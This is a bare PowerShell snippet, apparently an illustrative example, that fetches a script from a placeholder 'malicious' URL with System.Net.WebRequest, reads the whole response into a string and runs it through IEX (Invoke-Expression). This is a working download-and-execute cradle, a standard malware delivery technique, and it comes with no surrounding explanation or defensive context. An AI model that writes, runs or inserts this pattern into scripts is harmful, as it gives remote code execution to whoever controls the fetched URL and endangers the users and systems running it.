$webreq = [System.Net.WebRequest]::Create(‘https://maliciousscripturl/malicious.ps1’)

$resp=$webreq.GetResponse()

$respstream=$resp.GetResponseStream()

$reader=[System.IO.StreamReader]::new($respstream)

$content=$reader.ReadToEnd()

IEX($content)
